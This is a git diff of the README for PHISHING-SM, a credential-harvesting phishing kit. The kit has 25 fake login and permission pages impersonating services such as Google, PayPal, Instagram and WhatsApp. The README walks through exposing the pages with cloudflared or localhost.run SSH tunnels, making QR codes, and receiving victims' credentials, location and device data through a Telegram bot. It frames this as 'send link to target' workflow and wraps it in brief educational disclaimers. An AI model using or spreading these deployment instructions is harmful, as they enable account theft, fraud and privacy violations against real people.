@@ -1,571 +1,340 @@
+```markdown
 # PHISHING-SM
-PHISHING-SM Tool - Complete Guide
 
-آلقيـــــــــآدهہ‌‏ آلزعيـــم ♕
+**Advanced Cloudflared Edition**  
+*Professional Python tool for authorized penetration testing and security research*
 
-📖 Introduction
+![Version](https://img.shields.io/badge/version-2.0-blue)
+![Python](https://img.shields.io/badge/python-3.7+-green)
+![License](https://img.shields.io/badge/license-Educational-red)
 
-PHISHING-SM is a professional Python-based tool designed for penetration testing and educational purposes. The tool creates professional phishing pages to collect credentials and device information.
+---
 
-⚠️ Important Warning: This tool is for educational purposes and authorized security testing only. Any unauthorized use is illegal.
+## 📖 Introduction
 
-🎯 Features
+**PHISHING-SM** is a professional Python‑based tool designed for **educational purposes** and **authorized penetration testing**. It creates realistic phishing pages to help security professionals understand credential harvesting techniques and test organizational defenses.
 
-· ✅ Multiple professional phishing pages (25 different pages)
-· ✅ Telegram bot integration for automatic results delivery
-· ✅ SSH tunneling with localhost.run for public access
-· ✅ Built-in PHP server with multiple port support
-· ✅ QR code generation for quick access
-· ✅ Process management and automatic cleanup
-· ✅ Colored and user-friendly interface
-· ✅ Automatic dependency checking and installation
+> ⚠️ **Important Warning**  
+> This tool is for **educational and authorized testing only**. Any unauthorized use against systems without explicit permission is **illegal**. The developer assumes **no liability** for misuse.
 
-📋 Requirements
+---
 
-System Requirements
+## ✨ Features
 
-· Python 3.7+
-· PHP 7.4+
-· OpenSSH Client
-· Linux or macOS system (supports Windows with WSL)
+| Category | Features |
+|----------|----------|
+| **Phishing Pages** | 25 professional templates (Amazon, Facebook, Google, Instagram, Telegram, etc.) |
+| **Delivery** | Cloudflared tunnel → public HTTPS URL + QR code generation |
+| **Automation** | PHP server auto‑start, token injection, process management |
+| **Monitoring** | Real‑time credential delivery via Telegram bot |
+| **User Interface** | Colored terminal, interactive control panel, progress animations |
+| **Cleanup** | Automatic process termination, token reversion, temp file removal |
+| **Cross‑platform** | Linux, macOS, Termux (Android), WSL |
 
-Dependencies
+---
 
-```bash
-# Ubuntu/Debian
-sudo apt update && sudo apt install php ssh curl qrencode tmux
+## 📋 Requirements
 
-# CentOS/RHEL
-sudo yum install php ssh curl qrencode tmux
+### System Requirements
 
-# macOS
-brew install php openssh curl qrencode tmux
-```
+- **Python** 3.7+
+- **PHP** 7.4+
+- **Cloudflared** (automatically installed if missing)
+- Internet connection (for tunneling & Telegram)
+- **Optional:** `qrencode` (QR codes), `tmux` (session management)
 
-🚀 Installation
+### Supported Operating Systems
 
-1. Download the Tool
+| OS | Status |
+|----|--------|
+| Kali Linux / Ubuntu / Debian | ✅ Fully supported |
+| Termux (Android) | ✅ Fully supported |
+| macOS | ✅ Supported |
+| Fedora / Arch | ✅ Supported |
+| Windows (WSL) | ✅ Works via WSL |
+
+---
+
+## 🚀 Quick Installation
+
+### 1. Clone the repository
 
 ```bash
 git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
 cd PHISHING-SM
+```
+
+2. Install Python dependencies
+
+```bash
 pip install -r requirements.txt
 ```
 
-2. Verify Files
+If pip is not available: python3 -m pip install requests
 
-```bash
-ls -la
-# You should see PHP files and SM.py file
-```
-
-3. Make File Executable (Optional)
+3. Make the script executable (optional)
 
 ```bash
 chmod +x SM.py
 ```
 
-4. Run the Tool
+4. Run the tool
 
 ```bash
 python3 SM.py
 ```
 
+Note: The first run will automatically check for and install PHP and cloudflared if missing.
+
+---
+
 📱 Termux Installation (Android)
-
-1. Install Termux
-
-Download Termux from F-Droid or Google Play Store
-
-2. Update and Install Dependencies
 
 ```bash
 pkg update && pkg upgrade
-pkg install python php openssh curl git -y
-```
-
-3. Install Required Python Packages
-
-```bash
+pkg install python php git -y
 pip install requests
-```
-
-4. Clone and Run
-
-```bash
 git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
 cd PHISHING-SM
 python3 SM.py
 ```
 
-5. Termux Specific Notes
+Termux specific notes:
 
-· Some features like QR code generation may not work
-· Use Termux in landscape mode for better experience
-· Grant storage permissions if needed: termux-setup-storage
+· QR code generation may not work (optional)
+· Use landscape mode for better display
+· Grant storage if needed: termux-setup-storage
 
-🔐 SSH Key Setup for localhost.run
+---
 
-1. Generate SSH Key (if not exists)
+🔧 How It Works (Step by Step)
 
-```bash
-# Generate new SSH key
-ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
+1. Token Injection
+      The tool replaces the placeholder BBOTTTTTTTTTTT in all .php files with your Telegram bot token.
+2. PHP Server
+      Starts a PHP built‑in server on 127.0.0.1:8080.
+3. Cloudflared Tunnel
+      Launches cloudflared tunnel to expose the local server to the internet via a public *.trycloudflare.com URL.
+4. URL Generation
+      Creates the final phishing link:
+      https://xxxx.trycloudflare.com/selected_page.php?ID=YOUR_TELEGRAM_ID
+5. Credential Harvesting
+      When a victim submits credentials, they are sent directly to your Telegram bot.
+6. Cleanup
+      On exit, the tool stops all services and reverts tokens to the placeholder.
 
-# Or use existing key if you have one
-```
+---
 
-2. Manual SSH Tunnel Testing
+🤖 Telegram Bot Setup
 
-```bash
-# Basic test without key
-ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run
+Step 1: Create a Bot
 
-# With SSH key (recommended)
-ssh -i id_rsa -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run
-```
+1. Open Telegram and search for @BotFather
+2. Send /newbot and follow the instructions
+3. Copy the bot token (looks like 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789)
 
-3. Persistent SSH Setup
+Step 2: Get Your User ID
 
-```bash
-# Add to ~/.ssh/config
-Host lhr
-    HostName ssh.localhost.run
-    RemoteForward 80 localhost:8080
-    ServerAliveInterval 60
-    IdentityFile ~/.ssh/id_rsa
-```
+1. Search for @userinfobot on Telegram
+2. Send /start
+3. Copy your numeric User ID
 
-4. Verify SSH Key
+Step 3: Use in the Tool
 
-```bash
-# Check if key exists
-ls -la id_rsa
+When prompted, enter:
 
-# Test connection
-ssh -i id_rsa -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run
-```
+· Bot Token (from BotFather)
+· Your User ID (from userinfobot)
 
-🔧 Token Management System
+---
 
-Understanding Token Replacement
+🎮 Available Phishing Pages
 
-The tool automatically searches for the placeholder BBOTTTTTTTTTTT in all PHP files and replaces it with your actual bot token.
+# Page Name Description
+1 amazon.php Amazon login
+2 camera.php Camera permission request
+3 collection.php Device info collection
+4 copy.php Clipboard access
+5 discord.php Discord login
+6 facebook.php Facebook login
+7 freefire.php FreeFire game
+8 github.php GitHub login
+9 google.php Google login
+10 instagram.php Instagram login
+11 location.php Geolocation access
+12 microsoft.php Microsoft login
+13 netflix.php Netflix login
+14 paypal.php PayPal login
+15 peace.php PES game
+16 pupgmobile.php PUBG Mobile
+17 record.php Microphone access
+18 roblox.php Roblox login
+19 snab.php SnabChat
+20 spotify.php Spotify login
+21 telegram.php Telegram login
+22 tiktok.php TikTok login
+23 whatsapp.php WhatsApp login
+24 x.php X (Twitter) login
+25 yallalido.php Yalla Lido
 
-Manual Token Replacement
+Type 26 in the menu to see this help page.
 
-Method 1: Using sed (Linux/macOS)
+---
 
-```bash
-# Replace token in all PHP files
-sed -i 's/BBOTTTTTTTTTTT/YOUR_ACTUAL_TOKEN_HERE/g' *.php
+🕹️ Control Panel Commands
 
-# Verify replacement
-grep -r "YOUR_ACTUAL_TOKEN_HERE" *.php
-```
+Once the tunnel is active, you will see an interactive control panel:
 
-Method 2: Using Python Script
+Command Action
+q Quit – stop all services and exit
+u Show the current phishing URL
+r Refresh status (check if services are alive)
+s Display detailed service status
+qr Generate QR code of the URL (if qrencode installed)
+h Show help
+b Back to main menu (stop services)
 
-```python
-import os
-import re
+If you used tmux, you can also type t to attach to the tunnel session (Ctrl+B then D to detach).
 
-def replace_token(new_token):
-    php_files = [f for f in os.listdir('.') if f.endswith('.php')]
-    for php_file in php_files:
-        with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        
-        if 'BBOTTTTTTTTTTT' in content:
-            content = content.replace('BBOTTTTTTTTTTT', new_token)
-            
-            with open(php_file, 'w', encoding='utf-8') as f:
-                f.write(content)
-            print(f"Updated: {php_file}")
-
-# Usage
-replace_token("123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789")
-```
-
-Method 3: Using the Tool's Built-in Function
-
-The tool automatically handles token replacement when you:
-
-1. Enter your bot token
-2. Select a phishing page
-3. Start the services
-
-Token Troubleshooting
-
-Problem: Token not working after replacement
-
-Solutions:
-
-1. Check token format: Must be like 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789
-2. Verify bot is active: Send /start to your bot
-3. Check PHP files: Ensure token was replaced correctly
-4. Manual verification:
-
-```bash
-grep -r "YOUR_TOKEN" *.php
-```
-
-Problem: "BBOTTTTTTTTTTT" not found in files
-
-Solutions:
-
-1. Check current directory: Make sure you're in the right folder
-2. List PHP files: ls *.php
-3. Verify file contents: grep -r "BBOTTTTTTTTTTT" *.php
-
-Problem: Token reversion issues
-
-Solutions:
-
-1. Manual cleanup:
-
-```bash
-# Revert all tokens to placeholder
-sed -i 's/YOUR_TOKEN/BBOTTTTTTTTTTT/g' *.php
-```
-
-1. Restore from backup: If you have backup files
-2. Redownload: Clone the repository again
+---
 
 🛠️ Complete Troubleshooting Guide
 
-Common Errors and Solutions
+1. Token Errors
 
-1. Token Related Errors
+Error: [-] Invalid bot token format!
 
-```
-[-] Invalid bot token format!
-```
+Solution:
+Token must match: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789
+(10‑digit numeric, colon, 35+ alphanumeric characters)
 
-Solution: Verify token format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789
+2. Cloudflared Not Found
 
-2. PHP Server Errors
+Error: cloudflared: command not found
 
-```
-[-] No available ports found
-```
+Solution:
+The tool attempts to install it automatically. If that fails:
 
-Solution: The tool automatically tries different ports (8080, 8081, 8082, etc.)
+· Linux (apt): sudo apt install cloudflared
+· Termux: pkg install cloudflared
+· Manual: Download from cloudflare/cloudflared/releases
 
-3. SSH Tunnel Failures
+3. PHP Server Fails to Start
 
-```
-[-] Could not establish SSH tunnel
-```
+Error: [-] PHP server failed to start
 
 Solutions:
 
-· Check internet connection
-· Try running tool again
-· Verify port 22 is open
-· Test manual SSH connection:
+· Check if port 8080 is free: lsof -i :8080 (kill the process if needed)
+· Install PHP manually: sudo apt install php (or equivalent)
+· Run the tool with sudo if permission denied
+
+4. Tunnel URL Not Obtained
+
+Error: [-] Could not obtain tunnel URL
+
+Solutions:
+
+· Check your internet connection
+· Cloudflared may be blocked by a firewall
+· Wait a few seconds and retry
+· Manually test: cloudflared tunnel --url http://localhost:8080
+
+5. No PHP Files Found
+
+Error: [-] No PHP files found in current directory!
+
+Solution:
+Ensure you are inside the PHISHING-SM directory (where all .php files are located).
+List files: ls *.php
+
+6. Python requests Module Missing
+
+Error: ModuleNotFoundError: No module named 'requests'
+
+Solution:
 
 ```bash
-ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run
-```
-
-4. Missing PHP Files
-
-```
-[-] No PHP files found in current directory!
-```
-
-Solution: Ensure you're in the correct directory containing PHP files
-
-5. Dependency Issues
-
-```
-[-] Failed to install dependencies
-```
-
-Solution: Install dependencies manually according to your system
-
-Manual Dependency Installation
-
-For Ubuntu/Debian:
-
-```bash
-sudo apt update
-sudo apt install python3 php openssh-client curl qrencode tmux
-```
-
-For CentOS/RHEL:
-
-```bash
-sudo yum update
-sudo yum install python3 php openssh-clients curl qrencode tmux
-```
-
-For macOS:
-
-```bash
-brew install python3 php openssh curl qrencode tmux
-```
-
-For Termux (Android):
-
-```bash
-pkg update && pkg upgrade
-pkg install python php openssh curl git -y
 pip install requests
+# or
+python3 -m pip install requests
 ```
 
-🔄 Complete Workflow
+---
 
-1. Initial Setup
+🧹 Manual Cleanup
 
-· Dependency checking
-· PHP files verification
-· Token configuration
+If the tool exits abnormally, run these commands to clean up:
 
-2. Service Startup
+```bash
+# Stop PHP and cloudflared processes
+pkill -f 'php -S'
+pkill -f cloudflared
 
-· PHP server startup
-· SSH tunnel creation
-· Final URL generation
+# Remove temporary files
+rm -f tunnel_url.txt phishing_url.txt
 
-3. Execution
+# Revert tokens (if needed)
+sed -i 's/YOUR_ACTUAL_TOKEN/BBOTTTTTTTTTTT/g' *.php
+```
 
-· Send link to target
-· Monitor results via Telegram
-· Session management
-
-4. Termination
-
-· Stop services
-· Cleanup files
-· Restore settings
+---
 
 📁 File Structure
 
 ```
 PHISHING-SM/
-├── SM.py                          # Main tool file
-├── *.php                         # Phishing pages (25 pages)
-├── README.md                     # This documentation file
-└── requirements.txt              # Requirements file (if exists)
+├── SM.py                     # Main Python script
+├── *.php                     # 25 phishing templates
+├── requirements.txt          # Python dependencies
+├── README.md                 # This documentation
+└── (optional) logs/          # Created during runtime
 ```
 
-🎮 Available Phishing Pages
+---
 
-No. Page Name Description
-1 amazon.php Amazon login page
-2 camera.php Camera access request
-3 collection.php Device information collection
-4 copy.php Clipboard content access
-5 discord.php Discord login page
-6 facebookg.php Facebook login page
-7 freefire.php Freefire game login
-8 github.php GitHub login page
-9 google.php Google login page
-10 instagram.php Instagram login page
-11 location.php Location access request
-12 microsoft.php Microsoft login page
-13 netflix.php Netflix login page
-14 paypal.php PayPal login page
-15 peace.php PES game login
-16 pupgmobile.php PUBG Mobile login
-17 record.php Audio recording access
-18 roblox.php Roblox game login
-19 snab.php Snab app phishing
-20 spotify.php Spotify login page
-21 telegram.php Telegram login page
-22 tiktok.php TikTok login page
-23 whatsapp.php WhatsApp login page
-24 x.php X (Twitter) login page
-25 yallalido.php Yalla Lido phishing
+🔒 Security & Privacy
 
-🔧 Usage Instructions
+· No logs are stored permanently – temporary files are deleted on exit.
+· Tokens are reverted – your bot token is removed from PHP files after the session.
+· No external data collection – the tool only sends captured credentials to your own Telegram bot.
+· All traffic goes through Cloudflared – no SSH keys or third‑party services required.
 
-Basic Operation
+---
 
-```bash
-python3 SM.py
+📄 License & Disclaimer
+
+```
+Copyright (c) 2025 Mohamed Abu Al-Saud
+
+This tool is provided for EDUCATIONAL PURPOSES and AUTHORIZED PENETRATION TESTING only.
+
+The developer does not condone illegal activities. You are solely responsible for your actions.
+Misuse of this tool may violate laws in your jurisdiction. Always obtain written permission
+before testing any system you do not own.
 ```
 
-Detailed Steps:
+---
 
-1. Enter Bot Token: Input your Telegram bot token
-2. Enter User ID: Input your Telegram user ID
-3. Select Page: Choose page number (1-25)
-4. Wait for Setup: The tool automatically:
-   · Starts PHP server
-   · Creates SSH tunnel
-   · Generates phishing link
-   · Creates QR code
-
-Control Panel Commands:
-
-· q: Stop services and exit
-· t: Enter TMUX session (if available)
-· r: Refresh status
-· u: Show current URL
-· l: Show logs (without TMUX)
-· s: Show service status
-· b: Return to main menu
-
-🔒 Security and Cleanup
-
-The tool automatically:
-
-· Stops all services on exit
-· Deletes temporary files
-· Restores original token in PHP files
-· Kills all related processes
-
-Manual Cleanup:
-
-```bash
-# Stop all PHP and SSH processes
-pkill -f 'php -S'
-pkill -f 'ssh.*localhost.run'
-
-# Delete temporary files
-rm -f current_tunnel.url generated_url.txt php_server.log
-```
-
-📄 Rights and Responsibility
-
-Developer Rights
+📞 Contact & Support
 
 · Developer: Mohamed Abu Al-Saud
-· Channel: https://t.me/cybersecurityTemDF
-· Rights: All rights reserved to the developer
+· Telegram Channel: https://t.me/cybersecurityTemSM
+· GitHub Repository: https://github.com/MohamedAbuAl-Saud/PHISHING-SM
 
-Disclaimer
-
-```
-This tool is provided for educational purposes and authorized penetration testing only.
-The developer is not responsible for any illegal or unauthorized use.
-The tool should only be used on systems you own or have explicit permission to test.
-Compliance with local laws and regulations is mandatory.
-```
-
-🌟 Advanced Features
-
-1. Process Management
-
-· Automatic tracking of all processes
-· Smart cleanup on exit
-· State recovery after interruption
-
-2. Secure Token System
-
-· Automatic token replacement in all files
-· Original token restoration on exit
-· Token validation before use
-
-3. Advanced SSH Tunneling
-
-· TMUX support for persistent sessions
-· Detailed error logs
-· Automatic reconnection
-
-4. Professional UI
-
-· Professional colors and formatting
-· Perfect text alignment
-· Progress bars and animations
-
-📞 Support and Contact
-
-· Developer: Mohamed Abu Al-Saud
-· Channel: https://t.me/cybersecurityTemDF
-· Repository: https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
-
-🆘 Quick Help
-
-Quick Commands:
-
-```bash
-# Run the tool
-python3 SM.py
-
-# Check dependencies
-python3 SM.py --check-deps
-
-# Help
-python3 SM.py --help
-```
-
-Exit Codes:
-
-· 0: Success
-· 1: General error
-· 2: Missing dependencies
-· 3: Token error
-· 4: Network error
+For issues, please open a GitHub issue or contact via the Telegram channel.
 
 ---
 
-⚠️ Final Warning
+🙏 Acknowledgments
 
-This tool is for legal and ethical purposes only:
-
-· Authorized penetration testing
-· Security research
-· Educational purposes
-· Testing your own systems
-
-Prohibited uses include:
-
-· Illegal activities
-· Fraud or theft
-· Privacy violation
-· Any unethical purpose
+· Cloudflare for cloudflared – simple and reliable tunneling
+· Telegram Bot API for instant credential delivery
+· All security researchers who promote ethical hacking
 
 ---
 
-Developed by: Mohamed Abu Al-Saud
-All rights reserved © 2024
+Developed with ❤️ by Mohamed Abu Al-Saud
+All rights reserved – 2025
 
----
-
-🔄 Token Replacement Technical Details
-
-How Token Replacement Works
-
-1. Search Phase: The tool scans all PHP files for the placeholder BBOTTTTTTTTTTT
-2. Replacement Phase: Replaces all instances with your actual bot token
-3. Verification Phase: Checks if replacement was successful
-4. Cleanup Phase: Restores placeholder when tool exits
-
-Manual Token Management Commands
-
-```bash
-# Check if placeholder exists
-grep -r "BBOTTTTTTTTTTT" *.php
-
-# Replace token manually
-for file in *.php; do
-    sed -i 's/BBOTTTTTTTTTTT/YOUR_ACTUAL_TOKEN/g' "$file"
-done
-
-# Verify replacement
-grep -r "YOUR_ACTUAL_TOKEN" *.php
-
-# Revert to placeholder
-for file in *.php; do
-    sed -i 's/YOUR_ACTUAL_TOKEN/BBOTTTTTTTTTTT/g' "$file"
-done
-```
-
-Troubleshooting Token Issues
-
-If you encounter token-related problems:
-
-1. First: Check if your bot is active with @BotFather
-2. Second: Verify token format is correct
-3. Third: Manually check token replacement in PHP files
-4. Fourth: Use the manual commands above to fix issues
-
-Remember: The token BBOTTTTTTTTTTT is the placeholder that gets replaced with your actual Telegram bot token in all PHP files automatically by the tool
-
-Quick Help: Quick Commands: ```bash # Run the tool python3 SM.py # Check dependencies python3 SM.py --check-deps # Help python3 SM.py --help``` 
-
-Exit Codes: · 0: Success · 1: General Error · 2: Missing dependencies · 3: Token error · 4: Network error --- Final Warning: This tool is intended only for legal and ethical purposes: · Authorized penetration testing · Security research · Educational purposes · Testing your own systems. It is prohibited to use it for any of the following: · Illegal activities · Fraud or theft · Violation of others' privacy · Any unethical purpose --- Developed by: Mohamed Abu Al-Saud. All rights reserved 2025 
+``` 
